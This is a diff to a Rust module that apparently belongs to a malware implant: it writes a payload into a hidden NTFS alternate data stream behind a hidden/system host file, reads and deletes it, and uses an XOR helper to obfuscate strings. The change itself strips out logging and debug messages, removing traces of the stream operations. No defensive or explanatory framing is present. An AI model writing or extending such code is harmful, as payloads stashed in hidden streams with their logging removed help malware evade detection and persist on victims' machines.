@@ -6,7 +6,7 @@
 use std::fs;
 use std::io::{self, Read, Write};
 use std::path::Path;
-use log::{info, debug, warn};
+
 
 // XOR Helper (Key 0x55)
 fn x(bytes: &[u8]) -> String {
@@ -58,7 +58,7 @@ pub fn install_to_ads(payload: &[u8]) -> io::Result<String> {
     // Create empty host file
     if !host.exists() {
         fs::File::create(host)?;
-        debug!("Host created");
+
         set_hidden_attribute(host); // Make it hidden/system
     }
     
@@ -67,7 +67,7 @@ pub fn install_to_ads(payload: &[u8]) -> io::Result<String> {
     file.write_all(payload)?;
     file.sync_all()?;
     
-    debug!("ADS Write: {}b", payload.len());
+
     Ok(path_str)
 }
 
@@ -84,7 +84,7 @@ pub fn read_from_ads() -> io::Result<Vec<u8>> {
     let mut file = fs::File::open(&ads_path)?;
     let mut buffer = Vec::new();
     file.read_to_end(&mut buffer)?;
-    debug!("ADS Read: {}b", buffer.len());
+
     Ok(buffer)
 }
 
@@ -111,7 +111,7 @@ pub fn remove_ads() -> io::Result<()> {
     let path = get_ads_path();
     if Path::new(&path).exists() {
         fs::remove_file(&path)?;
-        debug!("ADS Removed");
+
     }
     Ok(())
 }
@@ -126,7 +126,7 @@ pub fn remove_all() -> io::Result<()> {
     
     if host.exists() {
         fs::remove_file(host)?;
-        debug!("Host Removed");
+
     }
     Ok(())
 }
